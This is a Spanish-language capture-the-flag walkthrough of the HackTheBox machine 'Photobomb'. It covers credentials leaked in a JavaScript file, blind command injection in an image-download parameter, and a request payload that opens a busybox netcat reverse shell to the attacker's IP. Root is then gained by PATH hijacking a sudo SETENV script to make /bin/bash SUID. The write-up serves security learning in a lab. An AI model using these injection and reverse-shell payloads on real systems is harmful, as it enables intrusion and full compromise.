![1](Images/1.png)

Se comienza con una fase de enumeración de puertos sobre la máquina objetivo, con el fin de identificar qué puertos se encuentran abiertos.

``sudo nnmap 10.129.228.60 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![2](Images/2.png)


A partir de los puertos detectados, se realiza un análisis más detallado con el objetivo de identificar los servicios asociados, sus versiones y recopilar información adicional mediante scripts de enumeración, lo que permite evaluar posibles vectores de ataque.

``sudo nmap 10.129.228.60 -sCV -p22,80 -oN target``

![3](Images/3.png)

En el resultado de este escaneo se observa una redirección hacia el dominio `http://photobomb.htb/`. Por ello, se añade dicho dominio al fichero `/etc/hosts` para resolver correctamente el servicio web.

![4](Images/4.png)

Se accede vía navegador:

![5](Images/5.png)


Al acceder al servicio web, se observa un mensaje que invita a iniciar sesión a través de un enlace: ``To get started, please click here! (the credentials are in your welcome pack).``

![6](Images/6.png)

Se trata de un panel de autenticación. En un primer intento se prueban credenciales genéricas sin éxito.

Durante la revisión del código fuente de la página principal, se identifica la carga de un script JavaScript: 

![7](Images/7.png)


``<script src="photobomb.js"></script>``

![8](Images/8.png)

Se detecta un mensaje dirigido a ``Jameson`` con información sensible embebida: ``http://pH0t0:b0Mb!@photobomb.htb/printer``

Este formato corresponde a credenciales incluidas en la URL (``basic auth``). Al acceder directamente con ellas, se obtiene acceso al panel:

![9](Images/9.png)

El panel permite seleccionar imágenes y descargarlas e distintos formatos y resoluciones. Se decide interceptar una petición con Burpsuite para analizar el funcionamiento interno.

![10](Images/10.png)


Se identifican tres parámetros principales en la petición:
- ``photo`` -> nombre del archivo.
- ``filetype`` -> formato de salida.
- ``dimensions`` -> resolución de la imagen.

El comportamiento de la aplicación permite modificar estos parámetros desde la interfaz, lo que abre la posibilidad de manipulación manual.

Al intentar introducir un nombre arbitrario en el parámetro ``photo``, se obtiene el siguiente error:

![11](Images/11.png)

-> ``Source photo does not exist``


Si se utiliza otro nombre arbitrario de un archivo que se conoce su existencia a través de una ruta relativa:

![12](Images/12.png)

-> ``Invalid photo``

Esto permite diferenciar validaciones específicas sobre el contenido de los parámetros, ya que sí está diferenciando entre un recurso que NO existe (``Source photo doest not exist``) y un recurso que, por el motivo que sea, se esté filtrando (``Invalid photo``).


También se encuentra un tercer error diferente si se modifica el parámetro ``filetype``:

![13](Images/13.png)

-> ``Invalid filetype``

Si se intenta modificar deliberadamente el valor del parámetro ``dimensions``:

![14](Images/14.png)

-> ``Invalid dimensions``


Si se eliminan los dos últimos parámetros (``filetype`` y ``dimensions``), se observa un comportamiento interesante:

![15](Images/15.png)

-> ``if !filetype.match(/^(png|jpg)/)``

Curioso cuanto menos. La validación del parámetro `filetype` únicamente comprueba el prefijo mediante una expresión regular, permitiendo valores que comiencen por `png` o `jpg`, lo que sugiere una posible debilidad en la validación estricta del tipo de archivo.

Esto hace pensar que tal vez se pueda bypassear siempre que la cadena inicial sea ``png`` o ``jpg``. 

¿Qué sucede si se intenta concatenar un comando en el valor del parámetro ``filetype``?

![16](Images/16.png)

Aunque no puede verse el output del comando, el servidor tarda en responder. A su vez, el retraso en la respuesta sugiere posible ejecución de comandos en backend sin retorno directo de output, lo que es consistente con un posible ``blind command injection``.



Se intenta validar la hipótesis mediante captura de tráfico con ``tcpdump``:

- Se abre tcpdump en máquina atacante: ``sudo tcpdump -I tun0``
- Se envía una prueba de inyección ejecutando un ``ping`` hacia la máquina atacante:

``photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg;ping+-c1+10.10.15.143&dimensions=3000x200``
- Se confirma la recepción de tráfico ICMP:

![17](Images/17.png)

La captura de tráfico ICMP confirma la ejecución de comandos en la máquina víctima. Dado que se confirma la existencia de RCE, se prepara una reverse shell:

- Se levanta listener: ``nc -nvlp 443``
- Se manda petición con reverse shell inyectada:

``photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg;busybox+nc+10.10.15.143+443+-e+/bin/bash&dimensions=3000x2000``
- Se revisa listener:

![18](Images/18.png)

Se obtiene acceso a la máquina víctima con el usuario ``wizard``.

Tras estabilizar la TTY, se localiza la flag de usuario en su directorio personal:

![19](Images/19.png)

# PRIVESC

Se revisan tareas programadas del sistema:

``crontab -l``

![20](Images/20.png)

Se comprueban los privilegios de sudo:
``sudo -l``

![21](Images/21.png)

-> ``(root) SETENV: NOPASSWD: /opt/cleanup.sh``

Se observa que el usuario ``wizard`` puede ejecutar el script ``/opt/cleanup.sh`` como root sin contraseña y permitiendo la modificación de variables de entorno (``SETENV``).

Si se analiza el contenido del script ``/opt/cleanup.sh``:

![22](Images/22.png)

Llama bastante la atención el último comando:

``find source_images -type f -name '*.jpg' -exec chown root:root {} \;``

Básicamente, busca todos los archivos `.jpg` dentro de `source_images` y cambia su propietario a usuario y grupo `root:root`.

Pero, a su vez, se está llamando al binario ``find`` de forma relativa, al contrario que para cat (``/bin/cat``) o truncate (``/usr/bin/truncate``).

Este comportamiento puede derivar en Path hijacking, dada la ausencia de rutas absolutas en la invocación del binario ``find`` dentro del script ``/opt/cleanup.sh`` y la manipulación del PATH mediante ``SETENV``.


- Se crea un script malicioso con nombre ``find`` en un directorio controlado por el usuario ``wizard``.
- Al ejecutar ``/opt/cleanup.sh`` con privilegios de root mediante sudo y tras manipular la variable PATH priorizando un directorio controlado por el atacante sobre las rutas del sistema, se fuerza la ejecución del binario ``find`` malicioso en lugar del binario legítimo.


Se procede:

- Se genera en ``/tmp`` el script ``find``:

![23](Images/23.png)

- Se le otorga permisos de ejecución y se comprueban:

``chmod +x /tmp/find``

![24](Images/24.png)

- Se ejecuta con privilegios de root (vía sudo) manipulando el PATH y se listan sus nuevos permisos:

``sudo PATH=/tmp:$PATH /opt/cleanup.sh``

![25](Images/25.png)

La ejecución del binario malicioso ha permitido modificar permisos de ``/bin/bash`` y otorgarle el bit SUID, por lo que puede ser ejecutada con permisos elevados:

``bash -p``

![26](Images/26.png)

Puede recogerse la flag de root en su directorio personal:

![27](Images/27.png)
